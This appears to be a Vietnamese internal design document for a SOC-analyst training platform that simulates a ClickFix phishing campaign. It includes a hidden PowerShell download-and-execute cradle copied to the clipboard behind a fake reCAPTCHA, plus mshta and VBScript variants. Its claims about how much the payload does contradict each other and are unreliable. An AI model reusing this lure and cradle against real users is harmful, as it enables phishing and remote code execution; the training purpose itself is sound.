# CODEBASE — SOC Simulation (ClickFix Campaign)

Tài liệu mô tả mã nguồn nội bộ của dự án **SOC Simulation** — nền tảng đào tạo phân tích
an ninh (SOC analyst training) mô phỏng chiến dịch **ClickFix phishing** vô hại.
Payload trong dự án **không có mã độc**: chỉ copy một lệnh `mshta` vào clipboard, khi chạy
thì gửi đúng một HTTP GET về server training để đánh dấu "user đã dính bẫy".

> Mục đích: giáo dục / red team nội bộ có ủy quyền. Cấm dùng cho phishing trái phép.

---

## 1. Tổng quan kiến trúc

```
┌─────────────────────────────────────────────────────────────────┐
│  Browser (SPA build-less, ES modules, hash routing #/logs)      │
│  frontend/index.html + frontend/js/*                            │
└───────────────┬─────────────────────────────────────────────────┘
                │ fetch /api/*  (cookie soc_session, same-origin)
┌───────────────▼─────────────────────────────────────────────────┐
│  FastAPI (uvicorn) — backend/app/main.py                        │
│  ├── routers: auth, alerts, logs, cases, endpoints,             │
│  │            intel, emails, sandbox, clickfix                  │
│  ├── query_parser.py  → SOC Query Language → SQL WHERE          │
│  └── StaticFiles mount "/" → frontend/  (sau cùng, /api优先)    │
└───────────────┬─────────────────────────────────────────────────┘
                │ sqlite3 (1 connection / request)
┌───────────────▼─────────────────────────────────────────────────┐
│  database/soc.db  ← schema.sql + seed.py (deterministic)        │
└─────────────────────────────────────────────────────────────────┘

Chuỗi bẫy ClickFix (training flow):
  Form đăng ký → token → modal "reCAPTCHA giả" → click checkbox
  → modal mở + TỰ TẢI file "công cụ xác minh" verification.vbs (/api/clickfix/tool?t=<token>)
     (token nhúng sẵn trong file; nút Download là backup nếu browser chặn auto-download)
  → user mở file (double-click) — wscript chạy im lặng:
      file vô hại tạo C:\Temp\hehehe.txt + GET /api/clickfix/verify?t=<token>
  → frontend poll /api/clickfix/status mỗi 2 giây → hiện nút "Verify" → đăng nhập vào console
```

**Chạy chương trình**: `run.bat` (cài `backend/requirements.txt` rồi chạy
`uvicorn app.main:app --app-dir backend --host 127.0.0.1 --port 8000 --reload`).
UI truy cập tại `http://127.0.0.1:8000`. Có thể chạy tách frontend ở cổng 5173
(`config.js` tự đổi `API_BASE` sang `http://127.0.0.1:8000`).

**Yêu cầu**: `fastapi>=0.115`, `uvicorn[standard]>=0.30` (Python ≥ 3.13 đang dùng).

---

## 2. Cấu trúc thư mục

```
ClickFix_Campaign/
├── run.bat                     # 1-click: install deps + start server
├── README.md                   # tuyên bố mục đích giáo dục
├── cases.js, endpoints.js      # ⚠ 2 file rỗng 0 byte ở root (rác, xem mục 9)
├── backend/
│   ├── requirements.txt
│   ├── app/
│   │   ├── main.py             #   58 dòng — entry point, CORS, static mount
│   │   ├── db.py               #   71 dòng — SQLite layer, auto-seed
│   │   ├── auth.py             #   81 dòng — PBKDF2, session cookie, current_user
│   │   ├── query_parser.py     #  374 dòng — SOC Query Language (lexer+parser)
│   │   └── routers/
│   │       ├── auth.py         #  122 — register/login/logout/me + rate limit
│   │       ├── alerts.py       #  100 — queue Main/Investigation/Closed
│   │       ├── logs.py         #  125 — search, field stats, histogram
│   │       ├── cases.py        #  103 — CRUD case + notes
│   │       ├── endpoints.py    #   68 — inventory, telemetry, containment
│   │       ├── intel.py        #   26 — IOC lookup + log_hits pivot
│   │       ├── emails.py       #   42 — mailbox + action
│   │       ├── sandbox.py      #   29 — dynamic analysis reports
│   │       └── clickfix.py     #  120 — verify/status/stats (in-memory, KHÔNG auth)
│   └── tests/
│       └── test_query_parser.py#   94 dòng — 13 tests + 8 subtests ✅ pass
├── database/
│   ├── schema.sql              #  129 dòng — 10 bảng SQLite
│   ├── seed.py                 #  610 dòng — bộ sinh dữ liệu deterministic
│   └── soc.db                  # DB đã seed sẵn (2 MB)
└── frontend/                   # SPA build-less (không bundler)
    ├── index.html, css/styles.css
    ├── verify.hta              # payload "vô hại" (VBScript, mshta)
    └── js/
        ├── app.js              # router hash, mount view, sidebar, logout
        ├── api.js              # fetch wrapper, ApiError, session
        ├── config.js           # API_BASE, PLATFORM_TZ = +03:00
        ├── utils.js            # html`` template, icon SVG, toast…
        └── views/              # landing, auth, monitoring, logs, cases,
                                # endpoints, intel, email, sandbox
```

Tổng khoảng **4.450 dòng** mã (py không tính `__pycache__`).

---

## 3. Backend

### 3.1 `main.py`
- `ensure_database()` chạy ngay khi import (xem 3.2).
- CORS cho `localhost:5173` (đổi được qua env `SOC_CORS_ORIGINS`).
- `auth.router` mount tại `/api` **không cần đăng nhập**; `clickfix.router` mount thẳng
  gốc (prefix `/api/clickfix`, cũng không auth — payload phải gọi được).
- 7 router còn lại (`alerts, logs, cases, endpoints, intel, emails, sandbox`) đều
  `Depends(get_current_user)` — **mọi API phân tích đều cần đăng nhập**.
- Static mount `/` serve `frontend/` (env `SOC_FRONTEND_DIR`), middleware đặt header
  `no-cache` cho `.js`/`.css`. SPA dùng hash routing nên không cần catch-all route.

### 3.2 `db.py`
- `ROOT = parents[2]` của file → thư mục repo; DB mặc định `database/soc.db`,
  đổi được qua env `SOC_DB_PATH`.
- `ensure_database()`: nếu `soc.db` chưa tồn tại → chạy `seed.py` để sinh; sau đó
  **mọi lần khởi động** đều `executescript(schema.sql)` (idempotent, `IF NOT EXISTS`)
  và tạo user demo nếu bảng `users` rỗng.
- `get_db()`: 1 connection / request, `row_factory=Row`, `PRAGMA foreign_keys=ON`.
- Helper: `row()`/`rows()` (tự `json.loads` các field khai báo), `now()`, `paginate()`
  (page_size clamp tối đa 200).

### 3.3 `auth.py`
- Password: **PBKDF2-HMAC-SHA256, 390.000 iterations**, salt 16 byte ngẫu nhiên,
  định dạng lưu `pbkdf2_sha256$iter$salt_hex$hash_hex`, so sánh bằng `hmac.compare_digest`.
- Session: token `secrets.token_urlsafe(32)`, **DB chỉ lưu SHA-256 của token**.
  Cookie `soc_session`: `httponly`, `samesite=lax`, `secure` nếu env `SOC_SECURE_COOKIE=1`.
  Hạn: 12h (mặc định) hoặc 30 ngày (remember me). Token hết hạn được dọn lúc tạo session mới.
- `get_current_user`: đọc cookie → join `sessions`+`users` → trả về public user
  (không lộ `password_hash`); hết hạn → 401.
- `ensure_demo_user()`: tài khoản training mặc định **`analyst` / `Analyst@123`**
  (chỉ tạo khi chưa có user nào).

### 3.4 `query_parser.py` — SOC Query Language (SOQL)
Bộ lexer + recursive-descent parser viết tay, compile query người dùng thành
**WHERE clause parameterized** (chống SQL injection hoàn toàn — không bao giờ
nối giá trị người dùng vào SQL).

Ngữ pháp:
```
query      := [expr] ( '|' command )*
expr       := and_expr ( OR and_expr )*
and_expr   := not_expr ( [AND] not_expr )*     # khoảng trắng = AND ngầm
not_expr   := ( NOT | '!' ) not_expr | atom
atom       := '(' expr ')' | comparison | term
comparison := FIELD op value | FIELD [NOT] IN (...) | FIELD (CONTAINS|STARTSWITH|ENDSWITH) value | FIELD EXISTS
term       := WORD | STRING                    # full-text search trên raw_log
command    := sort FIELD [asc|desc] | head N | limit N
```

- Field: `timestamp, type, source_address, source_port, destination_address,
  destination_port, hostname, username, process, command_line, action, raw_log, id`
  + alias Splunk-like (`src`, `dst`, `dport`, `user`, `image`, `cmd`, `msg`…).
- `*` trong giá trị với `=`/`!=` là wildcard → `LIKE ... ESCAPE '\'` (escape `% _ \`).
  So khớp chuỗi **không phân biệt hoa thường** (`COLLATE NOCASE`).
- Giới hạn an toàn: query ≤ 4000 ký tự, độ sâu ≤ 50, `IN` ≤ 500 giá trị,
  `head/limit` 1–10.000.
- Lỗi trả `QueryError(message, pos)` → HTTP 400 kèm vị trí lỗi để UI bôi đỏ.

Ví dụ: `process=*EDR-Freeze* OR raw_log CONTAINS "WerFaultSecure" | sort timestamp asc | head 50`

### 3.5 Các router nghiệp vụ

| Router | Endpoint chính | Chức năng |
|---|---|---|
| `auth` | `POST /api/auth/register` `login` `logout`, `GET /me` | Đăng ký validate bằng pydantic (username 3–32 `[A-Za-z0-9_.-]`, password ≥ 8 có chữ+số). Chống brute-force **in-memory**: 5 lần sai / 5 phút / IP → 429 |
| `alerts` | `GET /api/alerts?status=main\|investigation\|closed`, `/stats`, `/{id}`, `POST /{id}/take` `/release` `/close` | Queue 3 kênh. `take` chuyển sang investigation + gán owner; `close` nhận verdict `True Positive`/`False Positive` + note, tự đóng case liên quan |
| `logs` | `GET /api/logs/search`, `/fields`, `/fields/{field}/top`, `/histogram`, `/{id}` | Search bằng SOQL + lọc thời gian `from`/`to`, trả `took_ms` + `terms` (để highlight). Top values cho sidebar. Histogram tự chọn bucket: month/day/hour/minute theo span dữ liệu (bucket = `substr(timestamp,1,N)`) |
| `cases` | `GET/POST /api/cases`, `GET/PATCH /{id}`, `POST /{id}/notes` | 1 alert ↔ tối đa 1 case (409 nếu trùng). Mọi PATCH tự ghi note thay đổi (`status: A → B`) |
| `endpoints` | `GET /api/endpoints`, `/{id}`, `POST /{id}/containment` | Inventory 15 host. Chi tiết: process history (log type=OS), network (Network/Proxy/DNS), terminal history (shell: powershell/cmd/bash/sh/sudo), alerts liên quan (match `details LIKE %hostname%`). Containment chỉ set cờ `contained` |
| `intel` | `GET /api/intel?search=&ioc_type=` | IOC (ip/domain/url/md5/sha256) + `log_hits` = số log chứa giá trị IOC (pivot sang Log Management) |
| `emails` | `GET /api/emails`, `/{id}`, `POST /{id}/action` | Mailbox + action `Allowed/Blocked/Quarantined/Deleted` |
| `sandbox` | `GET /api/sandbox`, `/{id}` | Report JSON: processes, network, mitre, signatures; search theo tên file / sha256 / md5 |
| `clickfix` | `GET /api/clickfix/verify?t=`, `/status?t=`, `/stats` | Xem mục 5. **Không yêu cầu đăng nhập** |

---

## 4. Database (`database/schema.sql`)

10 bảng, timestamp lưu dạng chuỗi `YYYY-MM-DD HH:MM:SS` theo giờ platform **UTC+03**
(so sánh lexicographic = so sánh thời gian):

| Bảng | Ý nghĩa |
|---|---|
| `alerts` | `event_id` unique, severity, rule_name, type, status `main/investigation/closed`, owner, verdict, `details` JSON (hostname, ip, hash, cmdline…) |
| `logs` | 3.907 sự kiện: timestamp, type (OS/Network/Proxy/DNS/Web/Firewall/Auth…), src/dst ip+port, hostname, username, process, command_line, action, raw_log |
| `cases` + `case_notes` | Case điều tra, timeline ghi chú (cascade khi xóa case) |
| `endpoints` | hostname unique, ip, os, user, domain, last_seen, `contained`, `browser_history` JSON |
| `iocs` | IOC type/value/source/tags/threat/confidence/first_seen |
| `emails` | sender/recipient/subject/body/`attachments` JSON/action |
| `users` + `sessions` | username+email unique NOCASE, `password_hash`, role; sessions lưu `token_hash` (PK), `expires_at` |
| `sandbox_reports` | file_name, sha256, md5, verdict, score, `report` JSON |

Index: `alerts(status, created_at)`, `logs(timestamp/type/src/dst)`, `iocs(value)`, `sessions(user_id)`.

---

## 5. ClickFix training flow (chi tiết)

1. **`frontend/js/views/auth.js`** — form đăng ký có khối "reCAPTCHA Verification" giả
   (CSS `.cf-verify-*` giả lập cửa sổ xác minh màu xanh Google).
2. Sinh `token` từ form, hiện modal với 3 bước: Win+R → Ctrl+V → Enter.
3. Khi user click checkbox: spinner giả lập, sinh "Verification ID" 4 số, rồi
   **copy payload cradle vào clipboard** (chạy hidden hoàn toàn, ~195 ký tự —
   vừa khít hộp Run và hiện đủ dòng "I am not a robot" để giữ ảo giác):
   ```
   powershell -w hidden -nop -ep bypass -c "iex(iwr '<origin>/api/clickfix/s?t=<token>' -UseBasicParsing)" # ✅ ''I am not a robot - reCAPTCHA Verification ID: <vid>''
   ```
   - `-w hidden -nop -ep bypass`: không cửa sổ, không profile, bỏ execution policy —
     đúng mẫu payload ClickFix thật; phần `# ✅ ...` phía sau là **comment của PowerShell**.
   - **2 giai đoạn như campaign thật**: cradle tải `GET /api/clickfix/s?t=<token>` (stage-2)
     rồi `iex` hidden (`-UseBasicParsing` bắt buộc với PS 5.1). Stage-2 **100% vô hại**: tạo `C:\Temp\hehehe.txt` chứa `Hehehehe`
     (artifact để trainee thấy "máy đã chạy payload" và analyst có chỗ hunt) + 1 GET verify.
   - Server ghi dấu vết `downloaded` khi stage-2 được tải (ai tải payload kể cả chưa chạy).
4. **`frontend/verify.hta`** (biến thể dự phòng, chạy bằng `mshta`): VBScript parse token +
   origin từ URL, tạo cùng file `C:\Temp\hehehe.txt`, rồi `MSXML2.XMLHTTP` GET
   `→ /api/clickfix/verify?t=<token>`, tự đóng cửa sổ (`minimize`, không taskbar).
   Lưu ý: nhiều host bị Defender/policy chặn `mshta` — biến thể PowerShell ở trên là mặc định.
5. **`backend/app/routers/clickfix.py`**: store **in-memory** `_VERIFY_STORE` (dict +
   `Lock`), token TTL 30 phút, GC mỗi request. `/verify` ghi lại ip, user-agent, referer
   và in ra stdout `[CLICKFIX] ✅ VERIFIED ...`. `/status` cho frontend poll 2 giây/lần.
   `/stats` xem nhanh cả lớp ai đã dính bẫy.
6. User bấm "Verify" → frontend check `/status` → vào console SOC.
   Nếu user **không** chạy payload (nhận diện bẫy) → log `console.info("[ClickFix] User
   cancelled verification (good behaviour)")` (chỉ trên client, không gửi lên server).

> Lưu ý: `_VERIFY_STORE` nằm trong RAM → mất khi restart uvicorn, không chia sẻ được
> giữa nhiều process (code đã ghi chú: muốn scale thì thay Redis/DB).

---

## 6. Frontend

- SPA **build-less**: ES modules import trực tiếp, không bundler. `utils.js` có helper
  `html` (tagged template), `setHTML`, `icon()` (bộ SVG inline), `toast`, badge severity.
- **`app.js`**: bảng route `PUBLIC` (landing, login, register — `guestOnly`) và `ROUTES`
  (7 màn hình nghiệp vụ). Hash routing `#/logs?...`; route private mà chưa đăng nhập →
  redirect `#/login?next=...`. Mỗi view export `mount(el, params)` trả về hàm cleanup;
  view có thể export `update(params)` để pivot-in-place (ví dụ logs).
  Lắng nghe sự kiện `soc:unauthorized` (do `api.js` phát khi 401) → về login + giữ `next`.
- **`api.js`**: wrapper `fetch` kèm cookie (`credentials: "include"`), `ApiError`
  parse lỗi pydantic thành `{field: message}` để form hiển thị inline.
- **`views/logs.js`** (652 dòng — lớn nhất): ô query SOQL + ví dụ mẫu, sidebar top-values
  (click để thêm filter), histogram, bảng kết quả + drawer chi tiết, pivot
  (click hostname/ip/process → query mới), chế độ Basic/Pro.
- **`views/monitoring.js`**: 3 kênh alert Main/Investigation/Closed, filter severity/type,
  take/release/close với verdict.
- Các view còn lại: `cases` (list + detail + timeline notes), `endpoints` (inventory +
  tabs processes/network/terminal/alerts + nút containment), `intel`, `email`, `sandbox`,
  `landing` (trang marketing + demo terminal).

---

## 7. Dữ liệu seed (`database/seed.py`)

Sinh **deterministic** (`random.Random(1337)`) — chạy lại luôn ra cùng dữ liệu:

- **15 endpoints**: dải IP documentation `172.16.x.x` (EC2AMAZ-ILGVOIN, Joseph-PC,
  SharePoint01, DC01, FileServer01…), Windows + Linux, domain CORP.
- **20 alerts** `SOC325`–`SOC344` (event_id 303–322): EDR-Freeze tampering, WinRAR
  CVE-2025-8088, SharePoint ToolShell, Tomcat CVE-2025-24813, Lumma Stealer ClickFix,
  Lazarus phishing, OLE zero-click, PowerShell download cradle, RDP brute force,
  SQLi, DNS tunneling, ransomware, port scan… (mỗi alert có scenario log liên quan).
- **~3.907 log events** = scenario events + noise nền (01/2025 → 26/09/2025) từ nhiều
  host/nguồn log. Builder: `os_proc, os_event, net, firewall, proxy, dns, web, auth`
  sinh raw_log giả lập Sysmon (Windows, có `UtcTime` = giờ UTC) / auditd-style (Linux).
- **17 IOCs**, **10 emails** (phishing), **6 sandbox reports** (JSON mitre/signatures),
  **2 cases** (1 closed True Positive), `FileServer01` được set `contained=1`.
- Chạy tách: `python database/seed.py [path/to/soc.db]`; khi chạy qua app thì chỉ seed
  khi file `.db` chưa tồn tại.

Nội dung scenario **cố tình generic** (tên file placeholder, IP dải documentation,
tham số redacted) — mô phỏng *hình dạng* telemetry, không phải công cụ tấn công thật.

---

## 8. Bảo mật — điểm đã làm tốt

- SQL: 100% parameterized; SOQL compile ra `?` placeholder + whitelist field.
- Password PBKDF2 390k iter + salt ngẫu nhiên, so sánh constant-time.
- Session token ngẫu nhiên 32 byte, chỉ lưu hash SHA-256 trong DB; cookie `httponly` +
  `samesite=lax`; dọn session hết hạn.
- Rate limit đăng nhập 5 lần / 5 phút / IP.
- Validate input bằng pydantic (độ dài, regex, enum Literal).
- Toàn bộ API nghiệp vụ đều sau `get_current_user` (trừ auth + clickfix — chủ đích).
- Payload ClickFix vô hại thật sự: chỉ 1 HTTP GET, không tải/chạy mã gì thêm.

---

## 9. Vấn đề kỹ thuật / việc còn lại

1. **`cases.js` và `endpoints.js` ở root = 0 byte** — file rác, đã bị commit vô git.
   Gợi ý: xóa.
2. **Không có `.gitignore`** → repo đang commit cả `database/soc.db` (2 MB, chứa cả
   user demo + session hash) và toàn bộ `__pycache__/*.pyc` (đổi code là git diff rác).
   Gợi ý: thêm `.gitignore` (`__pycache__/`, `*.pyc`, `database/soc.db`) rồi
   `git rm --cached`.
3. **ClickFix store in-memory** — mất khi restart, không chạy được đa process/worker.
4. **Demo credential** `analyst / Analyst@123` được seed tự động — ổn cho training,
   nhưng phải đổi nếu demo ra ngoài.
5. Rate limit brute-force cũng in-memory (reset khi restart, né được bằng cách restart —
   chấp nhận được với training).
6. Timestamp lệch chuẩn: schema nói UTC+03 (`config.js` `PLATFORM_TZ = "+03:00"`) trong
   khi `db.now()` dùng giờ local máy — máy chạy lệch TZ thì dữ liệu seed và data mới
   sẽ lệch nhau. Giữ máy chạy UTC+03 hoặc sửa `now()` về TZ cố định.
7. `alerts.close` tự động close cả case liên quan nhưng `cases.update` không đồng bộ
   ngược lại (đóng case tay không đóng alert) — hành vi cố ý hay thiếu thì nên quyết
   rồi ghi chú vào code.

---

## 10. Tests

`backend/tests/test_query_parser.py`: **13 tests + 8 subtests — tất cả PASS**
(chạy `python -m pytest backend/tests`), phủ lexer/parser SOQL: precedence, implicit AND,
NOT/`!`, wildcard, IN, CONTAINS/STARTSWITH/ENDSWITH, EXISTS, sort/head/limit, alias,
lỗi cú pháp + vị trí lỗi, escape `LIKE`, giới hạn độ dài/độ sâu.

Chưa có test cho router/auth/seed — nếu mở rộng scoring cá nhân (roadmap của bạn) thì
nên bổ sung test cho luồng verdict + close alert.
